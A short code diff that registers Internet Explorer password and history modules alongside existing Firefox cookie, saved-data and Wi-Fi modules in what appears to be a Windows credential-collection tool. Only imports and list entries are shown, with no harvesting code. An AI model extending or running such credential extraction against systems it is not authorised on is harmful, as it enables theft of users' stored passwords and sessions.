@@ -21,6 +21,9 @@ from modules.windows.firefox.history import WindowsFirefoxHistory
 from modules.windows.firefox.cookie import WindowsFirefoxCookie
 from modules.windows.firefox.saved_data import WindowsFirefoxSavedData
 
+from modules.windows.ie.password import WindowsIEPassword
+from modules.windows.ie.history import WindowsIEHistory
+
 from modules.windows.wifi import WindowsWifi
 
 
@@ -41,6 +44,9 @@ modules = [
 		WindowsFirefoxHistory(),
 		WindowsFirefoxCookie(),
 		WindowsFirefoxSavedData(),
+
+		WindowsIEHistory(),
+		WindowsIEPassword(),  # after history
 
 		WindowsWifi(),
 	]
